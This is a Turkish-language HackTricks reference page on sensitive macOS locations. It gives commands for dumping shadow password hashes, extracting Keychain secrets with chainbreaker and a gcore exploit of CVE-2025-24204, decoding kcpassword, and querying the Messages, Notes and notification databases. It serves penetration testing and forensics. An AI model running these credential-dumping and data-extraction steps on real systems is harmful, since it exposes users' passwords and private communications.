# macOS Hassas Konumlar ve İlginç Daemon'lar

{{#include ../../../banners/hacktricks-training.md}}

## Parolalar

### Shadow Passwords

Shadow password, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumunda bulunan plist'lerde saklanır.\
Aşağıdaki one-liner, **kullanıcılar hakkındaki tüm bilgileri** (hash bilgileri dahil) dump etmek için kullanılabilir:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Bunun gibi scriptler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu script**](https://github.com/octomagon/davegrohl.git), hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.

`-m 7100` (macOS PBKDF2-SHA512) ile tüm service olmayan hesapların creds'lerini hashcat formatında dump edecek alternatif bir one-liner:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Bir kullanıcının `ShadowHashData` değerini elde etmenin başka bir yolu da `dscl` kullanmaktır: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Bu dosya yalnızca sistem **single-user mode** ile çalıştırıldığında kullanılır (bu nedenle çok sık kullanılmaz).

### Keychain Dump

Parolaları **decrypted** olarak **dump** etmek için security binary kullanıldığında, kullanıcının bu işleme izin vermesini isteyen birkaç istem görüntülenir.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Modern macOS'ta en ilgi çekici backing store'lar genellikle **`~/Library/Keychains/login.keychain-db`** ve **`/Library/Keychains/System.keychain`** konumlarında bulunur. Bunlar SQLite tabanlı dosyalardır; ancak plaintext erişimi hâlâ **`securityd`** tarafından yönetilir: ham DB'yi ele geçirmek, kullanıcının parolasını, `SystemKey`'i veya bellekteki bir master key'i de kurtarmadığınız sürece çoğunlukla yalnızca metadata ve şifrelenmiş blob'ları sağlar.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Bu yoruma [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) dayanarak, bu tools'ların Big Sur'da artık çalışmadığı görülüyor.

### Keychaindump Genel Bakışı

**keychaindump** adlı bir tool, macOS keychain'lerinden parolaları extract etmek için geliştirilmiştir; ancak bir [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)'da belirtildiği üzere Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır. **keychaindump** kullanımı, attacker'ın erişim kazanmasını ve **root** yetkilerine escalate olmasını gerektirir. Tool, kolaylık sağlamak amacıyla kullanıcı login olduğunda keychain'in varsayılan olarak unlock edilmesi ve uygulamaların kullanıcının parolasını tekrar tekrar istemeden keychain'e erişebilmesi gerçeğinden yararlanır. Ancak kullanıcı keychain'ini her kullanımdan sonra lock etmeyi seçerse **keychaindump** etkisiz hâle gelir.

**Keychaindump**, Apple tarafından keychain'e erişim için kritik olan authorization ve cryptographic operations daemon'ı olarak tanımlanan **securityd** adlı belirli bir process'i hedefleyerek çalışır. Extraction süreci, kullanıcının login parolasından türetilen bir **Master Key**'i identify etmeyi içerir. Bu key, keychain dosyasını okumak için gereklidir. **Master Key**'i locate etmek için **keychaindump**, `vmmap` komutunu kullanarak **securityd**'nin memory heap'ini tarar ve `MALLOC_TINY` olarak işaretlenmiş alanlarda olası key'leri arar. Bu memory konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel master key'leri belirledikten sonra **keychaindump**, master key adayı olduğunu gösteren belirli bir deseni (`0x0000000000000018`) bulmak için heap'leri tarar. Bu anahtarı kullanabilmek için **keychaindump**'ın kaynak kodunda açıklandığı üzere deobfuscation dahil olmak üzere ek adımlar gerekir. Bu alana odaklanan analistler, keychain'i decrypt etmek için gereken kritik verilerin **securityd** prosesinin belleğinde tutulduğunu unutmamalıdır. **keychaindump**'ı çalıştırmak için örnek bir komut:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), bir OSX keychain'inden aşağıdaki bilgi türlerini adli açıdan güvenilir bir şekilde extract etmek için kullanılabilir:

- [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile cracking için uygun Hashed Keychain password
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) kullanılarak elde edilmiş bir master key ya da SystemKey gibi bir unlock file verildiğinde Chainbreaker plaintext password'leri de sağlayabilir.

Keychain'i unlock etmek için bu yöntemlerden biri kullanılmadığında Chainbreaker, mevcut diğer tüm bilgileri görüntüler.

#### **Keychain anahtarlarını Dump et**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile keychain anahtarlarını (şifrelerle) dump edin**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Hash'i kırarak keychain anahtarlarını (parolalarla) dump etme**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Bellek dökümüyle keychain anahtarlarını (parolalarla birlikte) dump edin**

**memory dump** gerçekleştirmek için [bu adımları izleyin](../index.html#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcının parolasını kullanarak keychain anahtarlarını (parolalarla birlikte) dump etme**

Kullanıcının parolasını biliyorsanız, bu parolayı **kullanıcıya ait keychain'leri dump etmek ve decrypt etmek** için kullanabilirsiniz.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement üzerinden Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia), **`com.apple.system-task-ports.read`** entitlement'ı ile `/usr/bin/gcore`'u sundu; bu nedenle herhangi bir local admin (veya malicious signed app), SIP/TCC enforced olsa bile **herhangi bir process memory**'yi dump edebiliyordu. `securityd`'yi dump etmek, **Keychain master key**'yi clear olarak leak eder ve user password olmadan `login.keychain-db`'yi decrypt etmenizi sağlar.<sup>[[1]](#references)</sup>

**Savunmasız build'lerde (15.0–15.2) hızlı repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Çıkarılan hex key'i Chainbreaker'a (`--key <hex>`) vererek login keychain'i decrypt edin. Apple, **macOS 15.3+** sürümünde entitlement'ı kaldırdı; bu nedenle bu işlem yalnızca patch uygulanmamış Sequoia build'lerinde veya vulnerable binary'yi koruyan sistemlerde çalışır.

### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **automatic login** özelliğini **enabled** ettiyse **user'ın login password'ünü** tutar. Bu nedenle user, password sorulmadan otomatik olarak login olur (bu pek güvenli değildir).

Password, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** key'iyle xored olarak saklanır. User'ın password'ü key'den uzunsa key yeniden kullanılır.\
Bu, password'ü kurtarmayı oldukça kolaylaştırır; örneğin [**bu script**](https://gist.github.com/opshope/32f65875d45215c3677d) gibi script'ler kullanılabilir.

## Databases İçindeki İlginç Bilgiler

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

**`Sequoia`** öncesinde Notification Center store konumunu genellikle **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** içinde bulabilirsiniz. **`Sequoia+`** sürümlerinde Apple bunu **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** TCC-korumalı group container konumuna taşıdı.

İlgi çekici bilgilerin çoğu **blob** sütunlarında saklanır; bu nedenle içeriği çıkarmanız ve insan tarafından okunabilir bir biçime dönüştürmeniz gerekir (`plutil -p -`, `strings` veya küçük bir parser). Hızlı triage örnekleri:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Yakın zamanda ortaya çıkan privacy sorunları (NotificationCenter DB)

- macOS **14.7–15.1** sürümlerinde Apple, banner içeriğini uygun redaction uygulamadan `db2/db` SQLite veritabanında depoladı. **CVE-2024-44292/44293/40838/54504** numaralı CVE'ler, herhangi bir local user'ın DB'yi açarak diğer kullanıcıların notification metinlerini okumasına olanak tanıyordu (TCC prompt gerekmiyordu).
- Apple, daha yeni Sequoia build'lerinde DB'yi `group.com.apple.usernoted` içine taşıyıp TCC ile koruyarak bu durumu hafifletti. Bu nedenle güncel sistemlerde DB'yi okumak için genellikle doğru user context'i veya bir TCC bypass gerekir.<sup>[[3]](#references)</sup>
- Legacy endpoint'lerde artefact'ları korumak istiyorsanız, update veya reboot işlemi öncesinde `db`, `db-wal` ve `db-shm` dosyalarını birlikte kopyalayın.

### Notlar

Kullanıcıların **notları** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` konumunda bulunabilir.
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Yukarıdaki one-liner fazla gürültülüyse `ZICNOTEDATA.ZDATA` öğesini export edin, gunzip ile açın ve protobuf'u parse edin: bu, SQLite üzerinde doğrudan `strings` çalıştırmaktan genellikle daha güvenilirdir.

### Background Tasks / Login Items

**Ventura** sürümünden beri, kullanıcı tarafından onaylanan login items ve çeşitli background tasks, **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** gibi **BTM** depolarında ve sürümlendirilmiş sistem cache'i olan **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** içinde izlenir.

Bu dosyalar persistence, helper tools ve bazı MDM-managed background items öğelerini hızlıca belirlemek için kullanışlıdır:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Persistence açısından ve BTM internals için [auto-start locations sayfasına](../../macos-auto-start-locations.md#login-items) ve [Background Tasks Management notlarına](../macos-security-protections/README.md#background-tasks-management) bakın.

## Tercihler

macOS uygulamalarında tercihler **`$HOME/Library/Preferences`** konumunda, iOS'ta ise `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` konumunda bulunur.

macOS'ta **`defaults`** CLI aracı, **Preferences dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`**, `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` XPC servislerini sahiplenir ve tercihleri değiştirmek gibi işlemleri gerçekleştirmek için çağrılabilir.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` dosyası, node özniteliklerine uygulanan izinleri içerir ve SIP tarafından korunur.\
Bu dosya, belirli hassas bilgilere (diğerlerinin yanı sıra `ShadowHashData`, `HeimdalSRPKey` ve `KerberosKeys`) erişebilmeleri için belirli kullanıcılara uid yerine UUID üzerinden izin verir:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Bildirimleri

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirimleri alabilmek için istemcilerin `com.apple.system.notification_center` Mach portu üzerinden kayıt olması gerekir (`sudo lsmp -p <pid notifyd>` ile kontrol edebilirsiniz). Daemon, `/etc/notify.conf` dosyasıyla yapılandırılabilir.

Bildirimler için kullanılan adlar benzersiz reverse DNS gösterimleridir ve bir bildirim bunlardan birine gönderildiğinde, bunu işleyebileceğini belirten istemci(ler) bildirimi alır.

`notifyd` process'ine SIGUSR2 sinyali gönderip oluşturulan dosyayı okuyarak mevcut durumu (ve tüm adları) dump etmek mümkündür: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Dağıtık Bildirim Merkezi

Ana binary'si **`/usr/sbin/distnoted`** olan **Dağıtık Bildirim Merkezi**, bildirim göndermenin başka bir yoludur. Bazı XPC services sunar ve istemcileri doğrulamaya çalışmak için bazı kontroller gerçekleştirir.

### Apple Push Notifications (APN)

Bu durumda uygulamalar **topics** için kayıt olabilir. İstemci, **`apsd`** üzerinden Apple sunucularına bağlanarak bir token oluşturur.\
Ardından provider'lar da bir token oluşturmuş olur ve istemcilere mesaj göndermek için Apple sunucularına bağlanabilir. Bu mesajlar yerel olarak **`apsd`** tarafından alınır ve bildirimi bekleyen uygulamaya iletilir.

Preferences `/Library/Preferences/com.apple.apsd.plist` konumunda bulunur.

macOS'ta `/Library/Application\ Support/ApplePushService/aps.db`, iOS'ta ise `/var/mobile/Library/ApplePushService` konumunda yerel bir mesaj veritabanı bulunur. Bu veritabanında 3 tablo vardır: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Daemon ve bağlantılar hakkında şu yollarla da bilgi edinmek mümkündür:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Bunlar kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda mesaj içeren bir pop-up gösterme yöntemi sağlar.
- **The Bulletin Board**: iOS'ta kaybolan ve Notification Center'da saklanan bir banner gösterir.
- **`NSUserNotificationCenter`**: Bu, MacOS'taki iOS bulletin board'dur. Eski macOS sürümlerinde veritabanı genellikle `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumunda bulunur; Sequoia+ sürümlerinde ise `~/Library/Group Containers/group.com.apple.usernoted/db2/db` konumuna taşınmıştır.

## References

- [1] [HelpNetSecurity – macOS gcore entitlement, Keychain master key extraction işlemine izin verdi (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple, macOS Sequoia'daki Notification Center veritabanıyla ilgili gizlilik endişelerini gideriyor](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
